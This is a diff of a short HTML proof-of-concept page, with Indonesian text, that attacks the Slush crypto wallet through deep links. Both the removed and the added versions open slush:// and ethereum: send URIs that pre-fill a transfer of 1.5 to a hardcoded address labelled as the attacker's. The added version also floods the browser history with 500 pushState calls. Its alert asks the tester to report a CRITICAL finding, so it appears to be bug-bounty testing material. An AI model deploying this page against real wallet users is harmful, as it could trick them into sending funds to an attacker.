@@ -1,55 +1,40 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>PoC | Deep Link Auto-fill Transfer</title>
+    <title>PoC Simple | Slush Wallet</title>
     <style>
-        :root { --danger: #ff0055; --bg: #080808; }
-        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .test-card { border: 2px solid var(--danger); padding: 30px; border-radius: 15px; text-align: center; background: #111; box-shadow: 0 0 20px rgba(255, 0, 85, 0.3); }
-        .btn-exploit { background: var(--danger); color: white; border: none; padding: 15px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
-        .status { margin-top: 15px; font-size: 12px; color: #888; font-family: monospace; }
+        body { background: #000; color: #ff0055; font-family: sans-serif; text-align: center; padding: 50px; }
+        .box { border: 2px solid #ff0055; padding: 20px; border-radius: 10px; display: inline-block; }
+        button { background: #ff0055; color: #fff; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="test-card">
-    <h2 style="color:var(--danger)">URGENT: CRITICAL TEST</h2>
-    <p>Uji coba pengisian otomatis transaksi (Auto-fill) melalui Deep Link.</p>
-    
-    <button class="btn-exploit" onclick="testAutofill()">TEST AUTO-FILL TRANSFER</button>
-    
-    <div class="status" id="log">> Awaiting interaction...</div>
+<div class="box">
+    <h2>CRITICAL TEST</h2>
+    <p style="color: #888;">Klik untuk tes Auto-fill & Bridge Stress</p>
+    <button onclick="runExploit()">JALANKAN POC</button>
+    <div id="status" style="margin-top: 15px; font-size: 12px; color: #00ff00;"></div>
 </div>
 
 <script>
-    function testAutofill() {
-        const log = document.getElementById('log');
+    function runExploit() {
+        const out = document.getElementById('status');
         
-   
-        const attackerAddress = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";
-        const amount = "1.5";
-        
+    
+        const targetUri = "slush://send?to=0x742d35Cc6634C0532925a3b844Bc454e4438f44e&amount=1.5";
+        window.location.href = targetUri;
+        out.innerText = "Triggering: " + targetUri;
+
       
-        const deepLinks = [
-            `slush://send?to=${attackerAddress}&amount=${amount}`,
-            `slush://transfer?address=${attackerAddress}&uint256=${amount}`,
-            `ethereum:${attackerAddress}?value=${amount}`
-        ];
-
-        log.innerText = "> Sending malicious URIs...";
-
-        deepLinks.forEach((uri, index) => {
-            setTimeout(() => {
-                log.innerText = `> Triggering: ${uri}`;
-                window.location.href = uri;
-            }, index * 1000);
-        });
-
+        for (let i = 0; i < 500; i++) {
+            history.pushState(null, "", "#stress_" + i);
+        }
+        
         setTimeout(() => {
-            alert("PERIKSA DOMPET ANDA:\nJika halaman transfer terbuka dengan alamat penyerang dan jumlah 1.5 sudah terisi otomatis, ini adalah temuan CRITICAL.");
-        }, 3500);
+            alert("Cek Dompet: Jika terbuka dengan alamat & jumlah terisi, lapor sebagai CRITICAL.");
+        }, 1000);
     }
 </script>
 
